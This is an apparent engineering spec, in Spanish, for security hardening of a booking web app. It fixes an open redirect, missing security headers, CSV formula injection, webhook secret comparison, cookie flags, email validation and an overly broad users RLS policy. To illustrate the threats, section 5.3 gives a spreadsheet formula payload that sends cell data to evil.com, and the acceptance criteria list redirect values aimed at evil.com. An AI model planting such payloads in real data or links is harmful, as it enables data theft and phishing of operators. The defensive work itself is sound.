# 0016 — Endurecimiento de seguridad de la capa web

- **Estado**: approved
- **Autor**: Kenneth
- **Creado**: 2026-06-10
- **Última actualización**: 2026-06-11 (preguntas abiertas resueltas; aprobado — 1 PR con los 7, CSP verificada en local → enforcing)
- **Rama**: feat/0016-hardening-seguridad-web (cuando aplique)
- **PR**: # (cuando aplique)

> Este spec agrupa los hallazgos de **defensa en profundidad** de la auditoría de
> seguridad del 2026-06-10: **M-1** (open redirect), **M-2** (headers de seguridad
> ausentes), **M-4** (inyección de fórmulas en CSV), **B-1** (comparación del webhook
> secret no constant-time + body sin validar), **B-2** (cookie `invite_set` sin flag
> `Secure`), **B-3** (`customer_email` sin validar) y **B-4** (RLS de `users`
> demasiado permisiva). Ninguno es por sí solo crítico, pero juntos cierran la
> superficie de ataque que queda tras el fix crítico del spec **0015** (que va
> aparte). El rate limiting (**M-3**) va en el spec **0017** porque requiere una
> decisión de infraestructura y vetting.
>
> Se agrupan porque comparten un mismo objetivo cohesivo (cerrar las brechas de
> hardening del audit) y la mayoría son cambios chicos de código/config. Cada hallazgo
> está documentado abajo como una subsección autocontenida: una sesión futura puede
> implementar **uno solo** con todo el contexto presente.

> **Nivel de detalle**: como en 0015, este spec es deliberadamente detallado a nivel
> de código (pedido de la auditoría). La sección 5 incluye, por hallazgo, qué archivos
> releer para recuperar el contexto del código vivo por tu cuenta.

## 1. Contexto y motivación

La auditoría de seguridad del 2026-06-10 confirmó que el modelo de autorización del
proyecto (RLS, guards de rol, tokens hasheados, funciones `SECURITY DEFINER`) está
bien construido, pero encontró una serie de **debilidades de defensa en profundidad**:
faltan headers HTTP de seguridad, hay un open redirect en el login, los CSV exportados
son vulnerables a inyección de fórmulas, la verificación del secreto del webhook no es
de tiempo constante, una cookie sensible no marca `Secure`, el email del cliente no se
valida, y la política RLS de lectura de `users` expone PII de todos los usuarios
internos a cualquier sesión autenticada.

Ninguno permite por sí solo comprometer el sistema hoy, pero cada uno reduce el costo
de un ataque o amplía el impacto de otra falla (p. ej., sin CSP, cualquier XSS futura
es mucho más explotable). Son los ítems que separan "funciona y es razonablemente
seguro" de "endurecido para producción con dinero real". Afectan sobre todo al
**operador y su staff** (clickjacking del panel, CSV malicioso abierto en Excel) y a
la **postura general** del sistema.

## 2. Objetivos

- Eliminar el open redirect del login validando el destino como ruta local.
- Servir un set completo de headers de seguridad HTTP (CSP, HSTS, anti-clickjacking,
  nosniff, Referrer-Policy, Permissions-Policy) compatible con el widget de OnvoPay.
- Neutralizar la inyección de fórmulas en todos los CSV exportados.
- Verificar el secreto del webhook en tiempo constante y validar el cuerpo del webhook
  con un esquema antes de usarlo.
- Marcar `Secure` (en producción) la cookie `invite_set` y revisar flags de cookies.
- Validar el formato del `customer_email` en el checkout.
- Restringir la lectura de `users` por RLS para no exponer PII de todo el staff a
  cualquier sesión autenticada.

## 3. Fuera de alcance

- **Rate limiting / anti-fuerza-bruta (M-3)**: spec 0017.
- **Fix de manipulación de precio (C-1)**: spec 0015.
- No se reescribe el flujo de invitación (spec 0010) ni el de auth; solo se endurecen
  detalles puntuales (cookie, redirect).
- **B-5 (magic links reusables hasta expirar)**: se acepta como diseño. Los tokens de
  reserva/guía otorgan acceso por posesión del link (TTL acotado, hash en DB). No se
  agrega invalidación de un solo uso en este spec; se documenta como riesgo aceptado en
  la sección 8. Si en el futuro se quiere un solo uso, es spec aparte.
- No se cambia OnvoPay como pasarela ni el esquema de webhook (secreto estático en
  header, es su diseño); B-1 solo endurece **cómo** comparamos y parseamos.

## 4. Historias de usuario

> Como operador, quiero que el panel y los datos de mi negocio estén protegidos por las
> defensas estándar de una app web con dinero (headers de seguridad, exportaciones
> seguras, cookies y secretos manejados con rigor), para reducir el riesgo de phishing,
> clickjacking, robo de sesión y manipulación.

Criterios de aceptación (uno por hallazgo, todos verificables):

- [ ] **M-1**: un POST/GET al login con `redirectTo` apuntando a un host externo
      (`https://evil.com`, `//evil.com`, `/\evil.com`) NO redirige fuera del sitio; se
      ignora y se usa el destino por defecto. Solo se aceptan rutas que empiezan con un
      único `/`.
- [ ] **M-2**: las respuestas HTTP incluyen `Content-Security-Policy`,
      `Strict-Transport-Security`, `X-Content-Type-Options: nosniff`,
      `Referrer-Policy`, `Permissions-Policy`, y protección anti-clickjacking
      (`X-Frame-Options: DENY` y/o `frame-ancestors 'none'`). El checkout con el widget
      de OnvoPay sigue funcionando bajo la CSP.
- [ ] **M-4**: un campo exportado que empieza con `=`, `+`, `-`, `@`, tab o CR se
      neutraliza (no lo ejecuta Excel/Sheets) en TODOS los CSV (reservas y reportes).
- [ ] **B-1**: la comparación del secreto del webhook usa comparación de tiempo
      constante; un cuerpo de webhook malformado o con campos faltantes se rechaza con
      400 sin lanzar excepción no controlada. En particular, un `amount`/`currency`
      ausente NO debe propagarse como `undefined` a la validación de monto del 0014: el
      cuerpo se valida con Zod antes de mapearlo a `WebhookPayload`.
- [ ] **B-2**: la cookie `invite_set` se emite con `Secure` cuando
      `NODE_ENV === 'production'` (sigue `HttpOnly` + `SameSite=Lax`).
- [ ] **B-3**: un checkout con `customer_email` con formato inválido se rechaza con
      error antes de crear hold/booking/payment.
- [ ] **B-4**: una sesión autenticada con rol `staff` no puede leer, vía el cliente
      autenticado, filas de `users` que no le corresponden según la política nueva; el
      panel admin de usuarios (admin-only) sigue funcionando.

## 5. Diseño técnico

### 5.0 Lectura obligatoria por hallazgo (recuperá el contexto vos mismo)

Este spec documenta el estado al **2026-06-10**; las líneas pueden haber cambiado.
Antes de tocar cada hallazgo, releé su(s) archivo(s) y confirmá el comportamiento.

- M-1: `web/app/[locale]/(auth)/login/actions.ts` (el `redirect(redirectTo ?? ...)`),
  `web/app/[locale]/(auth)/login/page.tsx` (el hidden `redirectTo`), `web/middleware.ts`
  (quién setea `?redirectTo=`). Comparar con `web/app/[locale]/auth/confirm/route.ts`,
  que maneja su `next` de forma segura (prefijo de locale + `new URL(path, origin)`) —
  ese patrón es la referencia de cómo hacerlo bien.
- M-2: `web/next.config.ts` (no tiene `headers()`; usa `withSentryConfig(withNextIntl(...))`).
  `web/components/public/CheckoutForm/CheckoutForm.tsx` (carga `https://sdk.onvopay.com/sdk.js`
  y renderiza el widget — la CSP debe permitirlo). `web/lib/db/*` y la env
  `NEXT_PUBLIC_SUPABASE_URL` (la CSP `connect-src` debe permitir Supabase). Sentry si hay DSN.
- M-4: `web/lib/format/csv.ts` (`escapeCsvField`/`toCsv`), `web/lib/booking/csv.ts`
  (`bookingsToCsv` — mete `customer_name`/`customer_email`), `web/lib/reports/csv.ts`,
  y las rutas `web/app/[locale]/(admin)/dashboard/bookings/export/route.ts` y
  `.../reports/export/route.ts`.
- B-1: `web/lib/payments/adapters/onvopay.ts` (`verifyWebhook`), `web/app/api/webhooks/onvopay/route.ts`
  (quién lo llama). Patrón a reusar: `web/lib/auth/invite-set-token.ts` ya usa
  `timingSafeEqual` con chequeo de longitud previo.
- B-2: `web/app/[locale]/auth/confirm/route.ts` (el `response.cookies.set(INVITE_SET_COOKIE, ...)`),
  `shared/constants/users.ts` (`INVITE_SET_*`). Revisar también si hay otras cookies
  propias seteadas a mano (grep `cookies().set`/`response.cookies.set`).
- B-3: `web/lib/booking/checkout-action.ts` (el `customerEmail` con `.trim().toLowerCase()`
  sin validar). Referencia de validación: `web/app/[locale]/(auth)/login/actions.ts`
  usa `z.string().email()`.
- B-4: `supabase/migrations/20260523000003_create_users.sql` y
  `20260523000009_fix_rls_grants_and_performance.sql` (la política
  `users_select_authenticated USING(true)`). Antes de restringir, **buscá todos los
  reads de `users` vía cliente autenticado** (no service_role): grep de
  `.from('users')` en `web/lib` y páginas del panel, y `getCurrentUser`/`getSession`
  en `web/lib/auth/server.ts`. Hay que confirmar que ningún flujo de `staff` dependa de
  leer filas ajenas de `users`.

### 5.1 (M-1) Open redirect en el login

**Causa raíz**: `signIn` hace `redirect(redirectTo ?? '/${locale}/dashboard')` con
`redirectTo` tomado de `formData` (poblado desde el query param). No se valida que sea
una ruta local, así que `redirectTo=https://evil.com` redirige fuera del sitio tras un
login exitoso. **Explotación**: el atacante manda a la víctima un link
`/es/login?redirectTo=https://evil.com`; la víctima se loguea en el form legítimo y
termina en el sitio del atacante (phishing/abuso de confianza).

**Remediación**: validar `redirectTo` como ruta local antes de usarlo. Aceptar solo si
empieza con un único `/` y no con `//` ni `/\` (que el navegador interpreta como
protocol-relative → host externo). Si no pasa, ignorarlo y usar el default. Sugerido:
un helper `safeRedirectPath(value, fallback)` en `web/lib/auth/` reutilizable. Regla:
`value.startsWith('/') && !value.startsWith('//') && !value.startsWith('/\\')`. Tener
en cuenta que `next/navigation` `redirect()` redirige a cualquier string, incluido
absoluto externo — por eso la validación es nuestra responsabilidad.

Detalle de locale (verificado): el middleware setea `redirectTo = pathname` **con
prefijo de locale** (`/es/dashboard/...`, `middleware.ts`) y el login lo reinyecta como
hidden field. Un `redirectTo` válido **ya trae el locale**, así que el destino se usa tal
cual (`redirect(redirectTo)`), sin anteponerle otro `/${locale}`. El default cuando no
hay `redirectTo` sí es `/${locale}/dashboard`. El helper `safeRedirectPath` solo decide
local-vs-externo; no debe duplicar el prefijo de locale.

### 5.2 (M-2) Headers de seguridad HTTP

**Causa raíz**: `web/next.config.ts` no define `headers()`. No se envía ningún header
de seguridad. Consecuencias: el panel puede ser enmarcado (clickjacking), no hay CSP
(cualquier XSS se vuelve mucho más explotable), no hay HSTS ni `nosniff` ni
`Referrer-Policy`.

**Remediación**: agregar una función `async headers()` a `nextConfig` que devuelva,
para todas las rutas, al menos:

- `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` (solo tiene
  efecto en HTTPS; inofensivo en local).
- `X-Content-Type-Options: nosniff`.
- `Referrer-Policy: strict-origin-when-cross-origin`.
- `Permissions-Policy` restrictiva (deshabilitar `camera`, `microphone`, `geolocation`,
  etc., que la app no usa).
- Anti-clickjacking: `X-Frame-Options: DENY` **y** la directiva `frame-ancestors 'none'`
  en la CSP (la CSP es la que respetan los navegadores modernos; `X-Frame-Options` por
  compatibilidad).
- `Content-Security-Policy`: la parte delicada. Debe permitir lo que la app realmente
  carga, sin abrir de más:
  - `default-src 'self'`.
  - `script-src`: `'self'` + `https://sdk.onvopay.com` (el SDK del widget). Evaluar si
    Next 15/React 19 requieren `'unsafe-inline'`/nonces para algún script de hidratación;
    medir en el checkout real. Preferir nonces a `'unsafe-inline'` si es viable.
  - `frame-src`/`child-src`: el dominio del iframe del widget de OnvoPay (verificar cuál
    usa el SDK al renderizar `#onvo-payment-container`).
  - `connect-src`: `'self'` + `NEXT_PUBLIC_SUPABASE_URL` (PostgREST/Realtime/Auth) +
    el endpoint de Sentry si hay DSN + lo que el SDK de OnvoPay golpee
    (`api.onvopay.com`/`sdk.onvopay.com`, confirmar en runtime con el panel de red).
  - `img-src`: `'self' data:` + el dominio de `cover_image_url` si las imágenes de tours
    son externas (verificar de dónde salen).
  - `style-src`: `'self'` (+ `'unsafe-inline'` solo si algún estilo inline lo exige;
    medir).
  - `frame-ancestors 'none'`; `base-uri 'self'`; `form-action 'self'`.

  **Importante**: una CSP mal armada rompe el checkout (el widget no carga) o la
  hidratación de Next. La implementación DEBE verificarse en el navegador real
  (`pnpm build && start`, abrir el checkout, mirar la consola por violaciones de CSP) —
  no solo en dev. Considerar arrancar con `Content-Security-Policy-Report-Only` para
  detectar violaciones sin romper, y recién endurecer a enforcing.

  **Interacción con Sentry/next-intl**: `next.config.ts` envuelve con
  `withSentryConfig(withNextIntl(nextConfig))`. `headers()` va dentro de `nextConfig`
  (se preserva a través de los wrappers). Verificar que Sentry no necesite ajustes de
  CSP adicionales (tunneling/report endpoint).

### 5.3 (M-4) Inyección de fórmulas en CSV

**Causa raíz**: `escapeCsvField` (`web/lib/format/csv.ts`) entrecomilla campos con
coma/comilla/salto de línea, pero no neutraliza campos que empiezan con `=`, `+`, `-`,
`@`, tab o CR. Excel/Google Sheets interpretan esos campos como **fórmulas** al abrir
el CSV. Datos controlados por el atacante (`customer_name`, `customer_email`, fijados
en el checkout) fluyen al CSV de reservas (`bookingsToCsv`). **Explotación**: el
atacante reserva con `customer_name = '=HYPERLINK("http://evil.com?l="&A1,"click")'`
(o `=cmd|...` en entornos vulnerables); cuando el operador exporta y abre el CSV, la
fórmula se ejecuta → exfiltración de datos de la planilla o, en configuraciones
inseguras, ejecución de comandos en la máquina del operador.

**Remediación**: neutralizar en `escapeCsvField` (punto central; cubre reservas y
reportes). Si el valor empieza con uno de `= + - @ \t \r`, prefijarlo con un apóstrofo
`'` (o un espacio) **y** seguir aplicando el entrecomillado existente. Mantener el BOM
UTF-8 y el resto del comportamiento. Agregar tests del helper con cada carácter
peligroso. Documentar en un comentario por qué el prefijo (defensa contra CSV/formula
injection), para que no se "limpie" como código muerto en el futuro.

### 5.4 (B-1) Webhook: comparación constant-time + validación del cuerpo

**Causa raíz**: en `web/lib/payments/adapters/onvopay.ts`, `verifyWebhook` compara
`signature !== webhookSecret` con `!==` (no constant-time) → fuga de timing teórica que
podría usarse para recuperar el secreto byte a byte. Además hace
`JSON.parse(rawBody) as OnvopayWebhookBody` sin try/catch ni validación: un cuerpo
malformado lanza una excepción no controlada, y campos faltantes (`data.amount`, etc.)
pasan como `undefined`.

**Remediación**:

- Comparar el secreto con `crypto.timingSafeEqual`, chequeando longitud primero (igual
  que ya se hace en `web/lib/auth/invite-set-token.ts`: convertir ambos a `Buffer`,
  comparar longitudes, y solo entonces `timingSafeEqual`). Si difieren en longitud,
  devolver `null` sin llamar a `timingSafeEqual` (que lanza si difieren).
- Validar el cuerpo con un esquema Zod antes de mapearlo (`type`, `data.id`,
  `data.status`, `data.amount`, `data.currency`). Envolver el `JSON.parse` para que un
  body inválido devuelva `null` (→ el handler responde 400) en vez de lanzar.
- **Nota de diseño (no es un bug a arreglar)**: OnvoPay usa un secreto estático en el
  header `X-Webhook-Secret`, no una firma HMAC por mensaje. Es su diseño y no lo
  cambiamos. La protección contra forja depende de HTTPS + la idempotencia (event id en
  la tx de `confirm_booking`, PR #27) + la validación de monto (0014). Mantener esas
  defensas; documentarlo para que no se confunda con una debilidad introducida acá.

### 5.5 (B-2) Cookie `invite_set` sin `Secure`

**Causa raíz**: en `web/app/[locale]/auth/confirm/route.ts`, la cookie firmada
`INVITE_SET_COOKIE` se setea con `httpOnly`, `sameSite: 'lax'`, `path`, `maxAge`, pero
sin `secure`. En producción (HTTPS) la cookie debería ser `Secure` para no viajar nunca
por HTTP.

**Remediación**: agregar `secure: process.env.NODE_ENV === 'production'` al
`cookies.set` de `invite_set` (en dev sigue funcionando sin HTTPS). Aprovechar para
auditar otras cookies propias seteadas a mano (grep `response.cookies.set` /
`cookieStore.set`) y aplicar el mismo criterio. Las cookies de sesión de Supabase las
maneja `@supabase/ssr` (ya marcan `Secure` según el entorno) — no tocarlas. Nota: la
cookie ya es `HttpOnly` + `SameSite=Lax` + TTL 15 min; sigue sin invalidación de un
solo uso (riesgo bajo, aceptado; ver sección 8).

### 5.6 (B-3) `customer_email` sin validar en el checkout

**Causa raíz**: `web/lib/booking/checkout-action.ts` toma `customer_email` y solo hace
`.trim().toLowerCase()`, sin validar formato (a diferencia del login, que usa
`z.string().email()`). El email se almacena y se usa como destinatario del email de
confirmación. Riesgo de inyección bajo (las APIs de email del worker usan JSON, no
concatenación de headers SMTP), pero es higiene de input y evita reservas con
destinatarios inválidos que nunca reciben su confirmación.

**Remediación**: validar `customer_email` con Zod (`z.string().email()`) en el Server
Action, antes de crear nada. Si es inválido, error genérico. Idealmente validar todo el
input del checkout con un esquema (instancia, cantidades, nombre, email) — se cruza con
el spec 0015, que ya toca este Server Action; coordinar para no duplicar. Si 0015 y 0016
se implementan juntos, unificar la validación del checkout en un solo esquema Zod.

### 5.7 (B-4) RLS de `users` demasiado permisiva

**Causa raíz**: la política `users_select_authenticated ON users FOR SELECT TO
authenticated USING (true)` permite que **cualquier** sesión autenticada (incluido
`staff`) lea **todas** las filas de `users`, incluyendo email, teléfono y rol de todos
los usuarios internos (admins incluidos). Como los guías no tienen login (solo
`public.users`), "authenticated" hoy es admin o staff; aun así, exponer la PII de todo
el staff/admin a cualquier staff es más de lo necesario.

**Restricción importante a respetar (verificado en código, 2026-06-10 — NO restringir a
admin-only):** el panel de salidas (`/dashboard/departures`, accesible a admin **y
staff**) lee `users` vía el cliente **autenticado**, no service_role:

- `web/lib/guides/repository.ts` → `listGuides()` hace
  `createSupabaseServerClient().from('users').select('id, full_name').eq('role','guide')`
  (filas de **otros** usuarios), y `listUpcomingDepartures()` embebe
  `users!guide_id ( id, full_name )` para mostrar el guía asignado.
- Solo el **write** de asignación (`web/lib/guides/assign-action.ts`) usa service_role.
  El guide-view público (`web/lib/guides/guide-view.ts`) también usa service_role.

Por lo tanto, una política `admin`-only rompería el panel de salidas para **staff** (lista
de guías vacía, nombre del guía asignado en blanco). RLS es a nivel de fila, no de
columna: si se permite leer la fila del guía, staff verá también su email/teléfono (menos
sensible que la PII de admin/staff; aceptable).

**Remediación**: reemplazar `USING (true)` por una política que permita leer:
`(select auth.jwt() ->> 'user_role') = 'admin'` **OR** `id = (select auth.uid())` (propia
fila) **OR** `role = 'guide'` (los guías son visibles al panel de admin/staff por la
asignación). Resultado: admin ve todo; staff ve su propia fila + todos los guías; staff
NO puede enumerar la PII de otros admin/staff. Eso cierra el hallazgo sin romper el panel.
Usar el patrón InitPlan (`(select ...)`).

**Antes de implementar — verificación obligatoria** (releer, no asumir): además de
`guides/repository.ts` (ya verificado arriba), buscar cualquier OTRO read de `users` vía
cliente autenticado: grep `.from('users')` en `web/lib` y páginas del panel. Candidatos:
`web/lib/auth/server.ts` (`getCurrentUser`/`getSession` leen la **propia** fila → cubierto
por `id = auth.uid()`); el detalle de reserva si mostrara el nombre de `checked_in_by`
(verificar si lo hace vía cliente autenticado y, si sí, ampliar la política o resolver ese
nombre por service_role). Documentar la decisión final. Esta es la **única migración** del
spec, así que pasa por revisión de `db-schema-guardian`.

## 6. Modelo de datos

- **M-1, M-2, M-3(no), M-4, B-1, B-2, B-3**: sin cambios al schema (código/config).
- **B-4**: una migración nueva
  (`supabase/migrations/<timestamp>_restrict_users_select.sql`) que reemplaza la
  política `users_select_authenticated` por una versión restringida:
  `USING ((select auth.jwt() ->> 'user_role') = 'admin' OR id = (select auth.uid()) OR role = 'guide')`,
  siguiendo el patrón InitPlan que el proyecto ya usa en `20260523000009`. El término
  `role = 'guide'` es necesario para no romper el panel de salidas (ver 5.7).
  Forward-only; revertir = recrear la política `USING(true)`.

## 7. Estados y transiciones

No aplica. Ningún hallazgo introduce o modifica una máquina de estados.

## 8. Casos borde y errores

- **M-1**: `redirectTo` vacío/ausente → default (`/${locale}/dashboard`). `redirectTo`
  con ruta local válida (`/dashboard/bookings`) → se respeta. `//evil.com`, `/\evil.com`,
  `https://evil.com`, `javascript:...` → se ignoran y se usa el default.
- **M-2**: si la CSP rompe el widget de OnvoPay o la hidratación, NO mergear en
  enforcing; usar `Report-Only` hasta afinar. Documentar en el PR las directivas
  finales y por qué cada origen está permitido.
- **M-4**: un campo que empieza con `=` pero es legítimo (raro en nombres/emails) se
  prefija igual; es el comportamiento correcto y esperado (la planilla lo muestra como
  texto). Campos numéricos negativos (`-5`) en columnas numéricas: como los CSV de este
  proyecto exportan montos formateados como texto, el prefijo no distorsiona datos; aun
  así, validar que los reportes numéricos sigan legibles.
- **B-1**: cuerpo no-JSON, JSON sin `data`, `amount` no numérico, `type` ausente →
  `verifyWebhook` devuelve `null` → handler responde 400. Secreto de longitud distinta →
  `null` sin llamar `timingSafeEqual`.
- **B-2**: en dev (HTTP) la cookie sin `Secure` sigue funcionando; en prod (HTTPS) con
  `Secure` también. No hay caso donde `Secure` en prod rompa (todo prod es HTTPS).
- **B-3**: email inválido → error antes de crear hold/booking/payment (sin efectos
  colaterales).
- **B-4**: tras restringir, si un flujo de staff dejara de ver un dato que necesitaba,
  se manifiesta como dato vacío/None en el panel (no como error) — por eso la
  verificación previa es obligatoria y hay que probar el panel como staff.
- **B-5 (riesgo aceptado, no se corrige acá)**: los magic links de reserva/guía son
  reusables hasta expirar; quien tenga el link (p. ej. un email reenviado) puede
  ejecutar la acción (ver/cancelar reserva, ver tours del guía). Mitigantes vigentes:
  TTL acotado, hash-only en DB, alta entropía. Si se quisiera un solo uso, es un spec
  aparte.

## 9. Impacto en otras áreas

- **Webhook (0006/0014/#27)**: B-1 endurece `verifyWebhook`; sin cambio funcional para
  webhooks legítimos.
- **Checkout (0006/0015)**: B-3 suma validación de email; se cruza con 0015 (mismo
  Server Action) — coordinar la validación de input.
- **Panel admin**: M-2 (headers/CSP) aplica a todo el dominio; B-4 puede cambiar qué ve
  staff en `users`. Probar el panel como admin y como staff.
- **Exportaciones (0008/0012)**: M-4 cambia el contenido de los CSV (campos peligrosos
  prefijados).
- **Auth/invitación (0010)**: B-2 (cookie) y M-1 (redirect) tocan el flujo de login e
  invitación; reprobar el onboarding completo.
- **i18n**: si M-1/B-3 agregan mensajes nuevos, textos ES/EN; si reusan errores
  genéricos existentes, sin cambios.
- **Infra/deploy**: los headers/CSP deben validarse en el build de producción real,
  no solo en dev (ver 5.2).

## 10. Plan de tests

- **M-1**: unit del helper `safeRedirectPath` (rutas locales válidas vs
  `//`, `/\`, absolutas, `javascript:`); test del Server Action que confirma que un
  `redirectTo` externo cae al default.
- **M-2**: test/aserción de que las rutas responden con los headers esperados (p. ej. un
  test de integración que hace fetch a una ruta y verifica presencia de CSP/HSTS/etc.);
  verificación manual en el navegador (consola sin violaciones de CSP, checkout
  funcional).
- **M-4**: unit de `escapeCsvField` con cada carácter peligroso (`= + - @ \t \r`) al
  inicio, confirmando el prefijo; test de `bookingsToCsv` con un `customer_name`
  malicioso.
- **B-1**: unit de `verifyWebhook`: secreto correcto/incorrecto/longitud distinta;
  cuerpo válido/no-JSON/campos faltantes. Confirmar que nunca lanza.
- **B-2**: test (o verificación manual) de que la cookie `invite_set` lleva `Secure` en
  `NODE_ENV=production`.
- **B-3**: unit/integración del checkout con email inválido → rechazo sin crear nada.
- **B-4**: integración contra DB real con sesión `staff` autenticada (patrón del 0012:
  `signInWithPassword` y `.from('users')` como `authenticated`), confirmando que staff
  ve su propia fila + las filas de guías (`role='guide'`) pero **NO** las de otros
  admin/staff; que admin sigue viendo todas; y que `listGuides`/`listUpcomingDepartures`
  (el panel de salidas) siguen devolviendo guías para una sesión staff. Reusar la lección
  del bug RLS del 0011: probar con cliente autenticado real, no service_role.
- **Manual (PR)**: onboarding de invitación completo (cookie), login con `redirectTo`
  malicioso, export de un CSV con nombre malicioso abierto en una planilla, checkout con
  el widget bajo la CSP.

## 11. Plan de rollout

- **Feature flag**: no. Son endurecimientos; aplican siempre.
- **Migración de datos**: ninguna (B-4 solo cambia una política, no datos).
- **Orden sugerido**: independiente de 0015 y 0017, pero si 0015 y 0016 se hacen juntos,
  unificar la validación del checkout. M-2 (CSP) es el ítem más propenso a romper en
  runtime: hacerlo con `Report-Only` primero y endurecer al final.
- **Reversible**: cada hallazgo es reversible por su cuenta (revertir el commit / la
  política). La CSP es lo único que podría requerir ajuste post-deploy si algún origen
  se omitió.
- **Comunicación**: ninguna al operador (cambios transparentes), salvo que B-4 cambie
  algo que el staff veía.

## 12. Métricas de éxito

- Un escaneo de headers (p. ej. securityheaders.com o un test propio) reporta CSP, HSTS,
  nosniff, Referrer-Policy, Permissions-Policy y anti-clickjacking presentes.
- 0 redirecciones externas posibles desde el login (test de regresión en verde).
- 0 campos de CSV sin neutralizar ante caracteres de fórmula (test en verde).
- `verifyWebhook` no lanza ante ningún input y compara en tiempo constante (tests en
  verde).
- Staff no puede enumerar PII de otros usuarios internos (test de integración en verde).

## 13. Preguntas abiertas

- [x] **Pregunta**: la política de B-4 ya quedó definida (`admin` OR propia fila OR
      `role='guide'`, ver 5.7/§6). Pregunta residual: ¿algún OTRO flujo de staff (p. ej.
      el detalle de reserva mostrando el nombre de `checked_in_by`) lee `users` ajenos
      vía cliente autenticado y necesitaría ampliar la política? Resolver con el grep de
      verificación de 5.7. **Dueño**: Kenneth **Antes de**: aprobar la migración de B-4.
      **Resuelto (2026-06-11, grep `.from('users')` en `web/`):** la política es segura y
      completa, no hace falta ampliarla. Reads autenticados de `users`: (a) `auth/server.ts`
      `getCurrentUser` → propia fila (`id=auth.uid()`); (b) `users/repository.ts` → panel
      `/dashboard/users` admin-only (admin ve todo); (c) `guides/repository.ts` →
      `role='guide'` (panel de salidas admin+staff); (d) `guides/guide-view.ts` y
      `assign-action.ts` → `service_role` (ignoran RLS). El detalle de reserva
      (`admin-detail.ts`) **NO** lee `users`: `checked_in_by` solo se usa en la escritura
      del check-in, nunca se resuelve a nombre vía cliente autenticado. Los 3 términos de la
      política cubren todos los reads sin romper el panel de staff.
- [x] **Pregunta**: ¿La CSP arranca en `Report-Only` por uno o dos deploys antes de
      enforcing, o se va directo a enforcing tras validar en el build de prod local?
      **Dueño**: Kenneth **Antes de**: mergear M-2.
      **Resuelto (2026-06-11): directo a enforcing tras validar en el build de prod local.**
      No hay deploy de prod todavía (main no alimenta prod), así que un Report-Only "por unos
      deploys" no aplica. La CSP se valida con `pnpm build && pnpm start` + navegador real
      (consola sin violaciones + checkout/widget de OnvoPay funcional, reusando el flujo de la
      PoC del 0015) y se mergea en enforcing. Si durante esa validación algo es difícil de
      afinar, se puede caer a `Report-Only` temporalmente, pero la meta del merge es enforcing.
- [ ] **Pregunta**: ¿`script-src`/`style-src` requieren nonces por Next 15/React 19, o
      alcanza con `'self'` + el origen de OnvoPay? Resolver midiendo en el checkout real.
      **Dueño**: quien implemente M-2 **Antes de**: pasar la CSP a enforcing.
